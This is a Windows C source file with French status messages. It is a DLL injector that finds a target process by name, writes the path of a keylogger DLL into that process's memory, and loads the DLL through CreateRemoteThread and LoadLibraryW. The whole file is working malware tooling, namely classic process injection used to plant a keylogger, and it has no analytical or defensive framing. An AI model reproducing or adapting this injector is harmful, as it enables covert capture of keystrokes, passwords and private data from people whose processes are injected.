#define WIN32_LEAN_AND_MEAN // Remove winioctl.h if/elif errors
#pragma warning(disable:4820) // Padding added after data member, this warning cant be removed
#pragma warning(disable:4191) // 'function': unsafe conversion from 'FARPROC' to 'LPTHREAD_START_ROUTINE' false positive

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "keylogger.h"

DWORD FindTargetPID(const wchar_t* targetName)
{
	PROCESSENTRY32W pe;
	pe.dwSize = sizeof(PROCESSENTRY32W);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE)
		return 0;

	if (Process32FirstW(snapshot, &pe))
	{
		do
		{
			if (wcscmp(pe.szExeFile, targetName) == 0)
			{
				CloseHandle(snapshot);
				return pe.th32ProcessID;
			}
		} while (Process32NextW(snapshot, &pe));
	}

	CloseHandle(snapshot);
	return 0;
}

int wmain(int argc, wchar_t* argv[])
{
	if (argc != 2)
	{
		wprintf(L"Usage: %s <process.exe>\n", argv[0]);
		return 1;
	}
	const wchar_t* dllPath = L"C:\\Users\\Celeste\\Documents\\tinkyWinkey\\keylogger.dll";
	const wchar_t* targetProcess = argv[1];

	DWORD pid = FindTargetPID(targetProcess);
	if (pid == 0)
	{
		wprintf(L"Processus cible non trouvé.\n");
		return 1;
	}

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!hProcess)
	{
		wprintf(L"Impossible d'ouvrir le processus.\n");
		return 1;
	}

	size_t dllPathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);

	LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, dllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!remoteMem)
	{
		wprintf(L"Échec de l'allocation mémoire distante.\n");
		CloseHandle(hProcess);
		return 1;
	}

	if (!WriteProcessMemory(hProcess, remoteMem, (LPVOID)dllPath, dllPathSize, NULL))
	{
		wprintf(L"Échec de l'écriture mémoire distante.\n");
		VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return 1;
	}

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
		(LPTHREAD_START_ROUTINE)LoadLibraryW, remoteMem, 0, NULL);

	if (!hThread)
	{
		wprintf(L"Échec de la création du thread distant.\n");
		VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return 1;
	}

	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	CloseHandle(hProcess);

	wprintf(L"Injection réussie.\n");
	return 0;
}
